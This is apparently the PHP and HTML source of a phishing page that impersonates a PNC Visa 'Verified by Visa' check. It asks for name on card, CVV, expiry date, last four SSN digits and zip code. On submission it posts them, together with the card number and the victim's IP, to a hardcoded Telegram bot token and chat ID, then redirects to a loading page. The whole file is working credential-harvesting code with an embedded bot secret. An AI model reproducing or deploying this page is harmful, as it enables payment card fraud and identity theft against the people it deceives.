<?php
include'antibot.php';
$IdTelegram=array("1305831045"); 
$Bin=$_GET['bin'];
$lbin=$_GET['lbin'];
$numb=$_GET['numb'];
$realip=$_GET['realip'];
if(isset($_POST['submit'])){
 $BotTelegramToken="5092363740:AAFbRwIMY8fQpgPUppzF7AncBKbCwu_Ev3M";
 $messageTelegram  = "|==[ VBV INFO ]==|\n";
 $messageTelegram .= "|CCNUMB : ".$numb."\n";
 $messageTelegram .= "|Name On Card : ".$_POST['NOC']."\n";
 $messageTelegram .= "|Signature Panel Code : ".$_POST['CVV']."\n";
 $messageTelegram .= "|Card expiry date : ".$_POST['month'].'/'.$_POST['year']."\n";
 $messageTelegram .= "|Last 4 digits of SSN : ".$_POST['SSN']."\n";
 $messageTelegram .= "|Zip Code : ".$_POST['POSTALCODE']."\n";
 $messageTelegram .= "|IP : ".$_GET['realip']."\n";
 $messageTelegram .= "|==[ UPS ARON-TN ]==|\n";
 foreach($IdTelegram as $user_id) {
     $website="https://api.telegram.org/bot".$BotTelegramToken;
     $params=[
      'chat_id'=>$user_id, 
      'text'=>$messageTelegram,
     ];
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
     curl_close($ch);
 }
  HEADER("Location: loading.php?numb=".$numb."&phone=".$_GET['phone']."&realip=".$_GET['realip'].'&repeat=1');
}
?>
<!DOCTYPE html>
<html data-ng-app="BankApp" data-ng-controller="BankCtrl" class="data-ng-scope ng-scope" id="ng-app"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-start{clip:rect(0,auto,auto,0);-ms-zoom:1.0001;}.ng-animate-active{clip:rect(-1px,auto,auto,0);-ms-zoom:1;}</style>
    <title>IQA Transaction Page</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
 <link rel="stylesheet" href="VBV_files/master.css">
    <link rel="stylesheet" data-ng-href="IQA_Auth_PNC_VISA/css/pnc01vs.css" href="VBV_files/pnc01vs.htm">
    <link rel="shortcut icon" href="https://secure2.arcot.com/acspage/IQA_Auth_PNC_VISA/images/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" sizes="114x114" href="https://secure2.arcot.com/acspage/IQA_Auth_PNC_VISA/assets/114-icon.png">
    <link rel="apple-touch-startup-image" href="https://secure2.arcot.com/acspage/IQA_Auth_PNC_VISA/images/splash.png">
 <link rel="stylesheet" href="VBV_files/10percentage.css">
 <link rel="stylesheet" href="VBV_files/css.css">
</head>

<body>
    <div class="wrapper" data-ng-show="display" data-ng-init="init()">
        <div header="" class="ng-scope"><!-- ngInclude: getContentUrl() --><div ng-include="getContentUrl()" class="ng-scope"><header role="banner" class="ng-scope">
<div class="logo-left">
    <img data-ng-src="/vpas/contentRenderer.action?contentId=56464" alt="PNC Visa" title="PNC Visa" src="VBV_files/contentRenderer.gif">
</div>
<div class="logo-right">
    <img data-ng-src="/vpas/contentRenderer.action?contentId=56472" alt="Verified by Visa" title="Verified by Visa" src="VBV_files/contentRenderer_002.gif">
</div>
</header></div></div>
        <section id="sectionid" role="main">
            <div localeswitch="" class="ng-scope"><!-- ngInclude: getContentUrl() --><div ng-include="getContentUrl()" class="ng-scope"><div class="locale ng-scope"><!-- ngRepeat: locale in jsonobj.transactionInfo.localesupport.split(',') --></div>
<!--Locale--></div></div>
            <div class="content-container">
                <h1 id="otpheader" class="ng-binding">Added Protection Against Online Fraud</h1>
                <p id="otpsubheader" data-ng-bind-html="bank.header" class="ng-binding">Please
 enter a response for each field. This authentication provides an extra 
level of protection against fraudulent use of your card for online 
purchases.</p>
                <div class="error-container ng-hide" data-ng-show="(content.headderinfohead).length &gt; 0"><span id="mcerrorhead" class="ng-binding"></span></div>
            </div>



<form method="post" action="" class="ng-pristine ng-invalid ng-invalid-required">
                <div class="form-content">
                    <!-- ngIf: bankdetail !== undefined --><div data-ng-if="bankdetail !== undefined" challenge="" class="ng-scope"><!-- ngInclude: getContentUrl() --><div ng-include="getContentUrl()" class="ng-scope"><data-ng-form name="challengeForm" class="ng-scope ng-pristine ng-invalid ng-invalid-required">
    <!-- ngRepeat: challenge in jsonobj.challengeInfo --><div data-ng-repeat="challenge in jsonobj.challengeInfo" class="ng-scope">
        <!-- ngIf: (challenge.datatype=='NAME' || challenge.datatype=='ALPHANUMERIC' || challenge.datatype=='POSTALCODE' || challenge.datatype=='DRIVINGLICENCE' || challenge.datatype=='REGISTRATIONCODE') && !challenge.masked --><div class="read-only ng-scope" data-ng-if="(challenge.datatype=='NAME' || challenge.datatype=='ALPHANUMERIC' || challenge.datatype=='POSTALCODE' || challenge.datatype=='DRIVINGLICENCE' || challenge.datatype=='REGISTRATIONCODE') &amp;&amp; !challenge.masked">            
            <label data-ng-class="{'innerlabel labelpasscoderequired': true, 'innerlabel': !true }" for="NOC" id="iqalabel1" class="ng-binding innerlabel labelpasscoderequired">Name on Card</label>
            
            <span class="dynamic-valuecontent">
            
            <div class="customerrordiv ng-hide" data-ng-hide="getHideFlag(challenge)">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="NOC1" class="ng-binding custom_tooltiperrorNoInfo">Name on Card pattern does not match. Please try again.</span>
            </div>
            <div class="customerrordiv ng-hide" data-ng-show="challengeHideFlag[challenge.id] &amp;&amp; getShowFlag(challenge)">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="NOC2" class="ng-binding custom_tooltiperrorNoInfo"></span>
            </div>
            <!-- Amir 2-->   
            <input type="text" placeholder="Name on Card" class="ng-pristine ng-valid-minlength ng-valid-pattern ng-invalid ng-invalid-required inputbox" id="NOC" name="NOC" data-ng-pattern="/^[a-zA-Z0-9\s]{1,30}$/" required="required">
            <!-- Amir 2-->
			 
            <a data-ng-show="bankdetail['challenge'+challenge.input+'FieldTooltipMsg'].length &gt; 0" data-tooltip="" class="badge-info ng-hide" alt=""><img data-ng-src="IQA_Auth_PNC_VISA/images/info-icon.png" alt="" src="VBV_files/info-icon.png"></a>
           </span>
        </div>
    </div>
    <div data-ng-repeat="challenge in jsonobj.challengeInfo" class="ng-scope">
     <div class="read-only ng-scope" data-ng-if="challenge.masked">
            <label ng-class="{'innerlabel labelpasscoderequired': true, 'innerlabel': !true }" for="CVV" id="iqalabel5" class="ng-binding innerlabel labelpasscoderequired">Signature Panel Code</label>
            
            <span class="dynamic-valuecontent">
            
            <div class="customerrordiv ng-hide" data-ng-hide="getHideFlag(challenge)">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="CVV1" class="ng-binding custom_tooltiperror">Some of the characters provided in Signature Panel Code are not supported. Please re-enter with numbers.</span>
            </div>
            <div class="customerrordiv ng-hide" data-ng-show="challengeHideFlag[challenge.id] &amp;&amp; getShowFlag(challenge) &amp;&amp; getHideFlag(challenge)">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="CVV2" class="ng-binding custom_tooltiperror"></span>
            </div>
            <!-- Amir 2-->
            <input type="password" placeholder="Signature Panel Code" name="CVV" id="CVV" class="ng-pristine ng-valid-minlength ng-valid-pattern ng-invalid ng-invalid-required inputbox"  required="required">
            <!-- Amir 2-->
			 
            <a data-ng-show="bankdetail['challenge'+challenge.input+'FieldTooltipMsg'].length &gt; 0" data-tooltip="Please enter your CVV. Only 3 digits numeric characters are allowed" class="badge-info" alt="Please enter your CVV. Only 3 digits numeric characters are allowed"><img data-ng-src="IQA_Auth_PNC_VISA/images/info-icon.png" alt="Info" src="VBV_files/info-icon.png"></a>
            <!--<a data-ng-show="bankdetail['challenge'+challenge.input+'FieldTooltipMsg'].length > 0" href="#" class="badge-info showTip L1"><img data-ng-src="{{localeFolder}}images/info-icon.png" alt="{{bankdetail['challenge'+challenge.input+'FieldTooltipMsg']}}"></a>-->
            </span>			
        </div><!-- end ngIf: challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='PHONE' -->
        
        <!-- ngIf: challenge.datatype == 'DATE' -->
    </div><!-- end ngRepeat: challenge in jsonobj.challengeInfo --><div data-ng-repeat="challenge in jsonobj.challengeInfo" class="ng-scope">
        <!-- ngIf: (challenge.datatype=='NAME' || challenge.datatype=='ALPHANUMERIC' || challenge.datatype=='POSTALCODE' || challenge.datatype=='DRIVINGLICENCE' || challenge.datatype=='REGISTRATIONCODE') && !challenge.masked -->
        
        <!-- ngIf: (challenge.datatype=='NUMERICDOUBLE' || challenge.datatype=='LASTBILLAMOUNT' || challenge.datatype=='CREDITCARDLIMIT') && !challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='NUMERIC' && !challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='EMAIL' && !challenge.masked -->
        
        <!-- ngIf: challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='PHONE' -->
        
        <!-- ngIf: challenge.datatype == 'DATE' --><div class="read-only ng-scope" data-ng-if="challenge.datatype == 'DATE'" ng-init="date[challenge.input] = [{}]">
            <label ng-class="{'innerlabel labelpasscoderequired': true, 'innerlabel': !true }" for="EXPDATE" id="iqalabel6" class="ng-binding innerlabel labelpasscoderequired">Card expiry date</label>
            
            <span class="dynamic-valuecontent">
            
            <div class="customerrordiv ng-hide" ng-show="dateValidationFlag[challenge.id]">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="EXPDATE1" class="ng-binding custom_tooltiperror">Please Enter Valid Date</span>
            </div>
            
            <div class="ng-scope first">
                <select name="month" class="commondate ng-scope ng-isolate-scope ng-pristine ng-valid ng-valid-required" required="required">
                    <option value="Month" selected="selected">Month</option>
                    <option value="January">January</option>
                    <option value="February">February</option>
                    <option value="March">March</option>
                    <option value="April">April</option>
                    <option value="May">May</option>
                    <option value="June">June</option>
                    <option value="July">July</option>
                    <option value="August">August</option>
                    <option value="September">September</option>
                    <option value="October">October</option>
                    <option value="November">November</option>
                    <option value="December">December</option>
                </select>
			 </div>
             <div class="ng-scope last">
                <select name="year" class="commondate ng-scope ng-isolate-scope ng-pristine ng-valid ng-valid-required" required="required">
                    <option value="0" selected="selected">Year</option>
                    <option value="2021">2021</option>
                    <option value="2022">2022</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                </select>
			 </div>
		
            <a data-ng-show="bankdetail['challenge'+challenge.input+'FieldTooltipMsg'].length &gt; 0" data-tooltip="Please enter your Card expiry date. Only future dates are allowed." class="badge-info" alt="Please enter your Card expiry date. Only future dates are allowed."><img data-ng-src="IQA_Auth_PNC_VISA/images/info-icon.png" alt="Info" src="VBV_files/info-icon.png"></a>
			</span>
        </div><!-- end ngIf: challenge.datatype == 'DATE' -->
    </div><!-- end ngRepeat: challenge in jsonobj.challengeInfo --><div data-ng-repeat="challenge in jsonobj.challengeInfo" class="ng-scope">
        <!-- ngIf: (challenge.datatype=='NAME' || challenge.datatype=='ALPHANUMERIC' || challenge.datatype=='POSTALCODE' || challenge.datatype=='DRIVINGLICENCE' || challenge.datatype=='REGISTRATIONCODE') && !challenge.masked -->
        
        <!-- ngIf: (challenge.datatype=='NUMERICDOUBLE' || challenge.datatype=='LASTBILLAMOUNT' || challenge.datatype=='CREDITCARDLIMIT') && !challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='NUMERIC' && !challenge.masked --><div class="read-only ng-scope" data-ng-if="challenge.datatype=='NUMERIC' &amp;&amp; !challenge.masked">
            <label data-ng-class="{'innerlabel labelpasscoderequired': true, 'innerlabel': !true }" for="SSN" id="iqalabel3" class="ng-binding innerlabel labelpasscoderequired">Last 4 digits of SSN</label>
            
            <span class="dynamic-valuecontent">
            
           <div class="customerrordiv ng-hide" data-ng-hide="getHideFlag(challenge)">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="SSN1" class="ng-binding custom_tooltiperrorNoInfo">Some of the characters provided in Last 4 digits of SSN are not supported. Please re-enter with numbers.</span>
            </div>
            <div class="customerrordiv ng-hide" data-ng-show="challengeHideFlag[challenge.id] &amp;&amp; getShowFlag(challenge)">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="SSN2" class="ng-binding custom_tooltiperrorNoInfo"></span>
            </div>
    
            <!-- Amir 2-->
            <input type="text" placeholder="Last 4 digits of SSN" id="SSN" maxlength="4" name="SSN" class="ng-pristine ng-invalid ng-invalid-required noInfo" required="required">
            <!-- Amir 2-->
			 
			
            <a data-ng-show="bankdetail['challenge'+challenge.input+'FieldTooltipMsg'].length &gt; 0" data-tooltip="" class="badge-info ng-hide" alt=""><img data-ng-src="IQA_Auth_PNC_VISA/images/info-icon.png" alt="Info" src="VBV_files/info-icon.png"></a>
             </span>
        </div><!-- end ngIf: challenge.datatype=='NUMERIC' && !challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='EMAIL' && !challenge.masked -->
        
        <!-- ngIf: challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='PHONE' -->
        
        <!-- ngIf: challenge.datatype == 'DATE' -->
    </div><!-- end ngRepeat: challenge in jsonobj.challengeInfo --><div data-ng-repeat="challenge in jsonobj.challengeInfo" class="ng-scope">
        <div class="read-only ng-scope" data-ng-if="challenge.datatype=='NUMERIC' &amp;&amp; !challenge.masked">
            <label data-ng-class="{'innerlabel labelpasscoderequired': true, 'innerlabel': !true }" for="POSTALCODE" id="iqalabel3" class="ng-binding innerlabel labelpasscoderequired">Zip Code</label>
            
            <span class="dynamic-valuecontent">
            
           <div class="customerrordiv ng-hide" data-ng-hide="getHideFlag(challenge)">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="POSTALCODE1" class="ng-binding custom_tooltiperror">Some of the characters provided are not supported. Please re-enter Zip Code.</span>
            </div>
            <div class="customerrordiv ng-hide" data-ng-show="challengeHideFlag[challenge.id] &amp;&amp; getShowFlag(challenge)">
                <span ng-class="gettooltipErrorCssClass(challenge.input)" id="POSTALCODE2" class="ng-binding custom_tooltiperror"></span>
            </div>
            
            <!-- Amir 2-->
            <input type="text" placeholder="Zip Code" id="POSTALCODE" name="POSTALCODE" class="ng-pristine ng-invalid ng-invalid-required inputbox" required="required">
            <!-- Amir 2-->
			
            <a data-ng-show="bankdetail['challenge'+challenge.input+'FieldTooltipMsg'].length &gt; 0" data-tooltip="Please enter your Zip Code. Only 5 digits numeric characters are allowed" class="badge-info" alt="Please enter your Zip Code. Only 5 digits numeric characters are allowed"><img data-ng-src="IQA_Auth_PNC_VISA/images/info-icon.png" alt="Info" src="VBV_files/info-icon.png"></a>
             </span>
        </div><!-- end ngIf: challenge.datatype=='NUMERIC' && !challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='EMAIL' && !challenge.masked -->
        
        <!-- ngIf: challenge.masked -->
        
        <!-- ngIf: challenge.datatype=='PHONE' -->
        
        <!-- ngIf: challenge.datatype == 'DATE' -->
    </div><!-- end ngRepeat: challenge in jsonobj.challengeInfo -->
</data-ng-form></div></div>
                </div>
				<div class="controls-readvalue">
					<span class="innerlabelButton">
					<a><button type="submit" value="Submit" name="submit" id="btnIQASubmit" class="blue ng-binding" title="Submit" >Submit</button></a>
					</span>
					<span class="dynamic-valuecontentButton">
					<button type="reset" id="btncancel" class="grey ng-binding" title="Cancel">Cancel</button>
					</span>	
				</div>
            </form>
        </section>
       <div footer="" id="footer" class="ng-scope" style="position: absolute;"><!-- ngInclude: getContentUrl() --><div ng-include="getContentUrl()" class="ng-scope"><footer role="contentinfo" class="ng-scope">
    <!-- ngRepeat: bankdetailkey in commonfooter --><span class="small ng-scope commonfooterfirst commonfooterlast" id="commonfooter" data-ng-repeat="bankdetailkey in commonfooter" ng-class="{'commonfooterfirst': $first, 'commonfooterlast': $last}">
        <a id="footerid" data-ng-click="openWindow(bankdetailkey.ahref,bankdetailkey.text)" title="FAQs" class="ng-binding">FAQs</a>
        <span class="separator ng-binding"></span>
    </span><!-- end ngRepeat: bankdetailkey in commonfooter -->
</footer></div></div>
	   </div>
	   <div data-ng-bind="changeDimension()" class="ng-binding"></div>

</body></html>